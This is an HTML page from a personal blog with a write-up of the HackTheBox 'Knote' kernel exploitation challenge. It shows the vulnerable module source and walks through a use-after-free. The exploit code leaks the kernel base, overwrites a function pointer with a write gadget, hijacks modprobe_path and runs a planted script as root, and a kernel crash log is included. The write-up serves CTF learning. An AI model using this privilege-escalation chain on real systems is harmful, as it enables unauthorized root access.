@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta property="og:image" content="/images/cover.jpg">
+    <title>sid main book</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Helvetica+Neue:400,700&display=swap" />
+    <link rel="stylesheet" href="/css/styles.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <header id=main-header>
+      <div>Sid, the personal journal</div>
+    </header>
+    <nav>
+        <a href="/">Home</a>
+        <a href="/writeups.html">Writeups</a>
+	<a href="https://github.com/sidhawkss/pwnchalls">Pwn</a>
+        <a href="/profile.html">About me</a>
+    </nav>
+    <main>
+	  <article id=content>
+		  <h2>HTB - KNOTE</h2>
+<p>Knote is a challenge from hackthebox of PWN category. The challenge is a kernel exploitation providing a module that perform operations under a note object. This report ignores the inital setup part, such as extracting the kernel image, set user to root, capture gadgets to help in debugging process, disable kernel address randomization, and other topics.</p>
+<p>The main goal is to explain the mindset behind abusing kernel objects, possible techniques, and to think about the problems that can happen in real world scenarios.</p>
+<p>The following code snippet highlights two objects that reside within the knote module, the first one is the knote structure that is used to receive data from the userland, control the size of the allocated data and pointers to functions that are responsible to perform encryption and decryption of the data. The second object is used to handle data sent by userland for final writing to the array of knote objects.</p>
+<pre><code class="language-c">struct knote {
+    char *data;
+    size_t len;
+    void (*encrypt_func)(char *, size_t);
+    void (*decrypt_func)(char *, size_t);
+};
+
+struct knote_user {
+    unsigned long idx;
+    char * data;
+    size_t len;
+};
+
+struct knote *knotes[10];</code></pre>
+<p>Looking at the next important function is the <mark>knote_ioctl</mark>,  which is responsible to handling the <a href="https://man7.org/linux/man-pages/man2/ioctl.2.html">IOCTL</a> calls executed in the userland application. There are five operations assigned to the function <mark>KNOTE_CREATE</mark>, <mark>KNOTE_DELETE</mark>, <mark>KNOTE_READ</mark>, <mark>KNOTE_ENCRYPT</mark>, <mark>KNOTE_DECRYPT</mark>. As the name implies, each command performs a specific operation whose ultimate goal is to control the object.</p>
+<pre><code class="language-c">static long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
+    mutex_lock(&knote_ioctl_lock);
+    struct knote_user ku;
+    if(copy_from_user(&ku, (void *)arg, sizeof(struct knote_user)))
+        return -EFAULT;
+    switch(cmd) {
+        case KNOTE_CREATE:
+            if(ku.len > 0x20 || ku.idx >= 10)
+                return -EINVAL;
+            char *data = kmalloc(ku.len, GFP_KERNEL);
+            knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
+            if(data == NULL || knotes[ku.idx] == NULL) {
+                mutex_unlock(&knote_ioctl_lock);
+                return -ENOMEM;
+            }
+
+            knotes[ku.idx]->data = data;
+            knotes[ku.idx]->len = ku.len;
+            if(copy_from_user(knotes[ku.idx]->data, ku.data, ku.len)) {
+                kfree(knotes[ku.idx]->data);
+                kfree(knotes[ku.idx]);
+                mutex_unlock(&knote_ioctl_lock);
+                return -EFAULT;
+            }
+            knotes[ku.idx]->encrypt_func = knote_encrypt;
+            knotes[ku.idx]->decrypt_func = knote_decrypt;
+            break;
+        case KNOTE_DELETE:
+            if(ku.idx >= 10 || !knotes[ku.idx]) {
+                mutex_unlock(&knote_ioctl_lock);
+                return -EINVAL;
+            }
+            kfree(knotes[ku.idx]->data);
+            kfree(knotes[ku.idx]);
+            knotes[ku.idx] = NULL;
+            break;
+        case KNOTE_READ:
+            if(ku.idx >= 10 || !knotes[ku.idx] || ku.len > knotes[ku.idx]->len) {
+                mutex_unlock(&knote_ioctl_lock);
+                return -EINVAL;
+            }
+            if(copy_to_user(ku.data, knotes[ku.idx]->data, ku.len)) {
+                mutex_unlock(&knote_ioctl_lock);
+                return -EFAULT;
+            }
+            break;
+        case KNOTE_ENCRYPT:
+            if(ku.idx >= 10 || !knotes[ku.idx]) {
+                mutex_unlock(&knote_ioctl_lock);
+                return -EINVAL;
+            }
+            knotes[ku.idx]->encrypt_func(knotes[ku.idx]->data, knotes[ku.idx]->len);
+            break;
+         case KNOTE_DECRYPT:
+            if(ku.idx >= 10 || !knotes[ku.idx]) {
+                mutex_unlock(&knote_ioctl_lock);
+                return -EINVAL;
+            }
+            knotes[ku.idx]->decrypt_func(knotes[ku.idx]->data, knotes[ku.idx]->len);
+            break;
+        default:
+            mutex_unlock(&knote_ioctl_lock);
+            return -EINVAL;
+    }
+    mutex_unlock(&knote_ioctl_lock);
+    return 0;
+}</code></pre>
+<p>In the <mark>KNOTE_CREATE</mark>, there are some restrictions on object creation. The first is the size of the object, which is limited to <mark>32</mark> bytes, and <mark>10</mark> allocations. The data chunk is allocated using the size provided by the user, which is limited to <mark>0x20</mark>(32 bytes). The last object is allocated using the size of the knote structe, also 32 bytes.</p>
+<p>The data assignment in this code resides in the if that executes <mark>copy_from_user</mark>. If the operation succeeds, the data sent by the user will be copied using the given length. If this fails, two kfree functions will be called to free the chunks. It's verify important to note that both objects are freed, but the pointers are no cleared. Therefore, the reference can be used in operations after the object is freed,</p>
+<p>With the order that the objects are freed, they are susceptible to use after free when a new object is allocated, since the last one freed was <mark>kfree(knotes[ku.idx])</mark> and this is the object that stores the data pointer, a size of the chunk (value that can be used to increase the read in <mark>KNOTE_READ</mark>, resulting in a large heap data address leak) and the most important part is the function pointers which can be replaced by a gadget that performs some attack.</p>
+<pre><code class="language-c">case KNOTE_CREATE:
+            if(ku.len > 0x20 || ku.idx >= 10)
+                return -EINVAL;
+            char *data = kmalloc(ku.len, GFP_KERNEL);
+            knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
+            if(data == NULL || knotes[ku.idx] == NULL) {
+                mutex_unlock(&knote_ioctl_lock);
+                return -ENOMEM;
+            }
+
+            knotes[ku.idx]->data = data;
+            knotes[ku.idx]->len = ku.len;
+            if(copy_from_user(knotes[ku.idx]->data, ku.data, ku.len)) {
+                kfree(knotes[ku.idx]->data);
+                kfree(knotes[ku.idx]);
+                mutex_unlock(&knote_ioctl_lock);
+                return -EFAULT;
+            }
+            knotes[ku.idx]->encrypt_func = knote_encrypt;
+            knotes[ku.idx]->decrypt_func = knote_decrypt;
+            break;</code></pre>
+<p><h2>Exploit</h2>(This post skips the hours of debugging and understanding how the values were organized and the possibilities of exploitation to evelate privileges in userland).</p>
+<p>A function were created to identify the success or failure of operations <mark>call_ioctl</mark>. The first allocation sets the index to 0, which will be the corrupted object, length is set to <mark>0x20</mark> with the data pointer to a random value to trigger the if statement, executing and freeing the kernel allocations.</p>
+<pre><code class="language-c">// OBJECT 1
+ku.idx  = 0;
+ku.len  = 0x20;
+ku.data = 0xdeadbeefcafebabe;
+call_ioctl(fd, KNOTE_CREATE, ku);
+
+// OBJECT 2
+ku2.idx = 0;
+ku2.len = 0x20;
+ku2.data= malloc(0x20);</code></pre>
+<p>The second allocation with <mark>ku2</mark> is done in the correct way to leak a pointer of the kernel heap memory that will be used later in the large read to leak a kernel address.</p>
+<pre><code class="language-c">// ABR
+*p = (unsigned long int *)ku2.data;
+call_ioctl(fd, KNOTE_READ, ku2);
+unsigned long int object_leak = p[2];
+printf("OBJECT_LEAK = %lx\n", object_leak);
+</code></pre>
+<p>To leak the address, an allocation of <mark>0x400</mark> bytes was made to obtain a random pointer availible in this running kernel. It's important to consider that in real world exploits, such actions can cause inconsistences in the exploitation process, there is no guarantee that a random pointer will always be present in the running instance, setups are differents and the kernel states are different. A good approach to be assetive is to spray objects that contains the same size, a pointer to a kernel address and get the pointer from the sprayed objects, this way reliability will increase.</p>
+<p>The kernel base was calculated from the extracted offset.</p>
+<pre><code class="language-c">// LEAK ADDRESSES
+ku.idx = 0;
+ku.len = 0x400;
+ku.data = malloc(0x400);
+call_ioctl(fd, KNOTE_READ,ku);
+*p = (unsigned long int *)ku.data;
+
+// unsigned long int k_leak = p[133];
+k_leak = p[129];
+k_base = k_leak - 0x8372d0;
+printf("K_LEAK = 0x%lx \n",k_leak);
+printf("K_BASE = 0x%lx \n",k_base);
+call_ioctl(fd, KNOTE_DELETE, ku);
+call_ioctl(fd, KNOTE_DELETE, ku2);</code></pre>
+<p>The last part of the exploit is to replicate the technique of providing a fake  value in data to trigger free, oveeerwriting the knote object with the <mark>mov qword ptr [rsi], rdi ; ret</mark> (from the call of IOCTL encryption the two registers are controllable). To make a test in the scope of function call, fake pointers can be set in the data of the corrupted knote. When the function pointer is called and the kernel crashes, the states of registers will be shown, this helps to know the scopes that there are possibilities to control.</p>
+<pre><code class="language-c">buff[0] = deadbeefcafebab1
+buff[1] = deadbeefcafebab2
+buff[2] = deadbeefcafebab3
+buff[3] = deadbeefcafebab4</code></pre>
+<p>Crash state: after call IOCTL KNOTE_ENCRYPT.</p>
+<pre><code class="language-c">RIP: 0010:0xdeadbeefcafebab3
+Code: Bad RIP value.
+RSP: 0018:ffffc90000087eb8 EFLAGS: 00000286
+RAX: ffff888000093c00 RBX: 000000000000133a RCX: 0000000000000000
+RDX: 0000000000000000 RSI: deadbeefcafebab2 RDI: deadbeefcafebab1
+RBP: ffffc90000087ee8 R08: 0000000000000003 R09: 0000000000000000
+R10: 0000000000000000 R11: 0000000000000000 R12: 00007ffd13d16c10
+R13: 000000000000133a R14: 00007ffd13d16c10 R15: ffff888007624000
+FS:  00000000021e53c0(0000) GS:ffffffff81832000(0000) knlGS:0000000000000000
+CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+CR2: 00000000021e7778 CR3: 0000000007664000 CR4: 00000000000006b0
+Kernel panic - not syncing: Fatal exception</code></pre>
+<p>To escalate privileges to root, the modprobe_path override technique was used. This allows to change the path of the modprobe binary to point to a controlled file. This file will be executed with root permissions, tools like pwntools can be used to search for the string <mark>/sbin/modprobe</mark> in the kernel binary to find the correct symbol offset. The <a href="https://sam4k.com/like-techniques-modprobe_path/">sam4k</a> article explains the internals of how modprobe can be used to escalate privileges.</p>
+<p>Basically, the new fake object is sent using 0x20 as size, with the part of the string that will be overwritten as <mark>/tmp/dead</mark>, the modprobe_path symbol address and the gadget <mark>mov qword ptr [rsi], rdi ; ret</mark>. To spawn the binary, it's just needed to create the malicious file that was used to override the symbol, create a file with an unknown header (the four bytes sent to /tmp/x) and calling the invalid created file, resulting in a call to the corrupted mobprobe.</p>
+<pre><code class="language-c">// ROP TO ABW
+ku.idx  = 0;
+ku.len  = 0x20;
+ku.data = 0xdeadbeefcafebabe;
+call_ioctl(fd, KNOTE_CREATE, ku); // --> trigger free
+
+ku2.idx = 1;
+ku2.len = 0x20;
+ku2.data= malloc(0x20);
+buff[0] = 0x6165642f706d742f; // /tmp/dead
+buff[1] = k_base + 0x837bc0; // modprobe_path
+buff[2] = k_base + 0x04b7c; // -> gadget
+buff[3] = 0;
+memcpy(ku2.data,&buff,32);
+
+call_ioctl(fd, KNOTE_CREATE, ku2);
+call_ioctl(fd, KNOTE_ENCRYPT, ku); // -> exec gadget
+call_ioctl(fd, KNOTE_DELETE, ku2);
+
+
+system("echo -e '#!/bin/sh\nchmod 777 /root' > /tmp/deadprobe");
+system("chmod +x /tmp/deadprobe");
+system("echo -e '\xde\xad\xbe\xef' > /tmp/x");
+system("chmod +x /tmp/x");
+system("/tmp/x");
+</code></pre>
+<p>The full exploit can be found here. The main motivation of this post is to explain a simple kernel bug that shows a bit about the logic to create a kernel exploit. Logically, it is a surface of this world and there are many possibilities of abusing the behavior of modules and the kernel itself. For each execution, it is important to debug the execution state of the exploit, observing the modifications of registers, function calls, allocated objects, where the data was placed and discover or consult the work of researchers on the internet to learn new techniques.</p>
+
+	  </article>
+    </main>
+    <footer><p>&copy; 2023 sidhawks.</p></footer>
+  </body>
+
+
+<script>
+hljs.highlightAll();
+</script>
+<style>
+
+article img {
+  max-width: 100%;
+  height: auto;
+  display: block;
+}
+
+mark {
+  background-color: #d6d6d6; /* your custom color */
+  color: #e1330d; /* text color inside mark */
+  padding: 2 12px;
+  border-radius: 3px;
+
+}
+
+</style>
+
+</html>
+
